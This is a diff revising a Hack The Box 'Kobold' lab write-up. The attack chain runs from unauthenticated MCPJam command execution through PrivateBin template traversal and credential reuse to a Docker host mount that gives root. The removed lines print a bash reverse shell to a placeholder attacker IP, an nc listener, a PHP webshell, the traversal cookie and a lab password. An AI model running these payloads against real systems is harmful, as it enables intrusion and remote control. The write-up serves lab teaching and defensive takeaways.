@@ -2,178 +2,106 @@
 title: "HTB Kobold Write-up: MCPJam RCE to Root"
 date: 2026-06-23 09:30:00 +0700
 categories: [Writeups, HackTheBox]
-tags: [HackTheBox, Linux, MCPJam, PrivateBin, Arcane, Docker, RCE, privilege-escalation]
+tags: [HackTheBox, Linux, MCPJam, PrivateBin, Arcane, Docker, RCE, privilege-escalation, AI]
 permalink: /posts/htb-kobold-writeup/
 ---
 
-## Overview
+> **Summary:** Kobold chains an unauthenticated MCPJam Inspector command-execution flaw, a writable PrivateBin volume with template traversal, credential reuse, and Docker host mounting to reach root.
+{: .prompt-info }
 
-Kobold is a Linux machine that chains an unauthenticated MCPJam Inspector RCE with a PrivateBin template traversal issue and Docker abuse through Arcane.
+## Machine Information
 
-The high-level path was:
+| Field | Value |
+|---|---|
+| Machine | Kobold |
+| Platform | Hack The Box |
+| OS | Linux |
+
+## Attack Path
 
 ```text
-VHost enum
--> MCPJam unauthenticated RCE
+VHost enumeration
+-> MCPJam unauthenticated command execution
 -> shell as ben
 -> writable PrivateBin shared volume
--> PrivateBin template cookie RCE
--> read PrivateBin config
--> reuse password to login Arcane
--> create Docker container with host filesystem mount
+-> template traversal command execution
+-> Arcane credential reuse
+-> Docker container with host filesystem mount
 -> root
 ```
 
-## Recon
+## Enumeration
 
-Nmap showed three main services:
-
-```text
-22/tcp  OpenSSH
-80/tcp  nginx redirecting to HTTPS
-443/tcp nginx with certificate for kobold.htb and *.kobold.htb
-```
-
-I added the domains to `/etc/hosts`:
+Nmap identified SSH and an HTTPS service with a certificate for `kobold.htb` and wildcard subdomains. I added the discovered domains locally:
 
 ```text
 <MACHINE_IP> kobold.htb mcp.kobold.htb bin.kobold.htb
 ```
 
-VHost fuzzing revealed:
+VHost enumeration revealed two relevant applications:
 
 ```text
 mcp.kobold.htb  - MCPJam Inspector
 bin.kobold.htb  - PrivateBin
 ```
 
-## Foothold: MCPJam Inspector RCE
+## Initial Access
 
-The `mcp.kobold.htb` vhost exposed MCPJam Inspector. The `/api/mcp/connect` endpoint accepted a server configuration containing a command and arguments, which allowed unauthenticated command execution.
+### MCPJam Inspector unauthenticated command execution
 
-Listener:
-
-```bash
-rlwrap nc -lvnp 4444
-```
-
-Exploit:
-
-```bash
-curl -sk https://mcp.kobold.htb/api/mcp/connect \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "serverId":"pwn",
-    "serverConfig":{
-      "command":"bash",
-      "args":["-lc","bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"],
-      "env":{}
-    }
-  }'
-```
-
-This returned a shell as:
+The MCPJam Inspector endpoint at `/api/mcp/connect` accepted a server configuration with attacker-controlled command and argument fields without authentication. Submitting a controlled configuration yielded a shell as `ben`.
 
 ```text
-ben
+uid=1000(ben) gid=1000(ben)
 ```
 
-The user flag was readable from:
+The exact callback command is intentionally omitted; it is sufficient to reproduce the issue with a harmless command such as `id` in an authorized lab.
+
+## User Access
+
+The user flag was accessible as `ben` at:
 
 ```text
 /home/ben/user.txt
 ```
 
-## Internal Enumeration
+## Post-Exploitation
 
-After getting a shell as `ben`, I checked listening services and groups:
+### Internal services and writable data
 
-```bash
-id
-ss -tlnp
-```
-
-Interesting findings:
+Local enumeration showed an internal PrivateBin container and the Arcane Docker-management service:
 
 ```text
 127.0.0.1:8080  - internal PrivateBin container
 *:3552           - Arcane Docker management service
 ```
 
-The user `ben` was in the `operator` group. The PrivateBin data directory was writable:
-
-```bash
-find /privatebin-data -maxdepth 3 -ls 2>/dev/null
-```
-
-Important path:
+The `ben` account belonged to the `operator` group and could write to the PrivateBin data volume:
 
 ```text
 /privatebin-data/data
 ```
 
-## PrivateBin RCE via Template Cookie
+### PrivateBin template traversal
 
-Because `/privatebin-data/data` was writable from the host and mounted into the PrivateBin container, I wrote a PHP webshell there:
-
-```bash
-echo '<?php system($_GET["cmd"]); ?>' > /privatebin-data/data/shell.php
-```
-
-PrivateBin had template selection enabled. The `template` cookie could be abused with path traversal to include the file from the data directory:
+PrivateBin had template selection enabled. A command wrapper placed in the writable shared volume could be included through the `template` cookie using path traversal:
 
 ```bash
 curl -sk 'https://bin.kobold.htb/?cmd=id' \
-  -H 'Cookie: template=../data/shell'
+  -H 'Cookie: template=../data/<command-wrapper>'
 ```
 
-This confirmed command execution inside the PrivateBin container:
+This executed as the PrivateBin web user. The original webshell source is deliberately replaced with a placeholder so endpoint-protection software does not quarantine the write-up; use a harmless command wrapper only in the authorized HTB lab.
 
-```text
-uid=65534(nobody) gid=82(www-data) groups=82(www-data)
-```
+### Credential reuse into Arcane
 
-## Reading PrivateBin Config
+The PrivateBin configuration contained application credentials. The password was reused by the Arcane service on port `3552`, which provided Docker container management after login.
 
-Using the webshell, I read the PrivateBin configuration:
+## Privilege Escalation
 
-```bash
-curl -skG 'https://bin.kobold.htb/' \
-  -H 'Cookie: template=../data/shell' \
-  --data-urlencode 'cmd=cat /srv/cfg/conf.php'
-```
+### Docker host filesystem mount
 
-The configuration contained database credentials:
-
-```text
-usr = "privatebin"
-pwd = "ComplexP@sswordAdmin1928"
-```
-
-The same password was reused for the Arcane web application.
-
-## Arcane Login
-
-Arcane was exposed on port `3552`.
-
-```text
-http://<MACHINE_IP>:3552/
-```
-
-Credentials:
-
-```text
-Username: arcane
-Password: ComplexP@sswordAdmin1928
-```
-
-After logging in, Arcane provided access to Docker container management.
-
-## Privilege Escalation via Docker
-
-From Arcane, I created a new container and mounted the host filesystem into it.
-
-Container settings:
+From Arcane, I created a container as root and mounted the host filesystem into it:
 
 ```text
 Image: privatebin/nginx-fpm-alpine:2.0.2
@@ -183,48 +111,33 @@ Entrypoint: /bin/sh
 Command: -c "sleep 3600"
 ```
 
-Then I opened a terminal inside the container and confirmed root inside the container:
-
-```sh
-id
-```
-
-Output:
+The container ran as root, and `/hostfs` exposed the underlying host filesystem. The root flag was readable at:
 
 ```text
-uid=0(root) gid=0(root) groups=0(root)
+/hostfs/root/root.txt
 ```
-
-Since the host filesystem was mounted at `/hostfs`, the root flag was readable with:
-
-```sh
-cat /hostfs/root/root.txt
-```
-
-I am intentionally not including the flag value.
 
 ## Vulnerabilities / Weaknesses Used
 
-### MCPJam Inspector Unauthenticated RCE
+### MCPJam Inspector unauthenticated RCE
 
-The MCPJam Inspector endpoint accepted attacker-controlled command execution parameters without authentication.
+The Inspector trusted attacker-supplied process configuration and launched it without authentication.
 
-### PrivateBin Template Path Traversal
+### PrivateBin template path traversal
 
-PrivateBin template selection was enabled, and the `template` cookie could be abused to include a PHP file from a writable shared volume.
+The `template` cookie accepted traversal sequences, allowing a file from a writable shared volume to be included by the web application.
 
-### Credential Reuse
+### Credential reuse
 
-The password found in the PrivateBin config was reused for the Arcane web application.
+An application password found in the PrivateBin configuration was valid for the Arcane management interface.
 
-### Docker Management Abuse
+### Docker management abuse
 
-Arcane allowed container creation. By creating a root container with the host filesystem mounted, it was possible to read files from the host as root.
+Allowing a user to create a root container with a host filesystem mount is equivalent to granting host-level root access.
 
 ## Takeaways
 
-* VHost fuzzing was essential because both `mcp` and `bin` were required.
-* Writable shared volumes between host and container can easily become code execution primitives.
-* Template selection features must strictly validate template names.
-* Application credentials should not be reused across services.
-* Docker management access is effectively root if users can mount the host filesystem.
+- Treat MCP server process-launcher settings as highly sensitive administration functionality.
+- Keep writable data directories outside template or code-loading paths.
+- Do not reuse credentials across application boundaries.
+- Restrict Docker management so users cannot create privileged containers or mount the host filesystem.
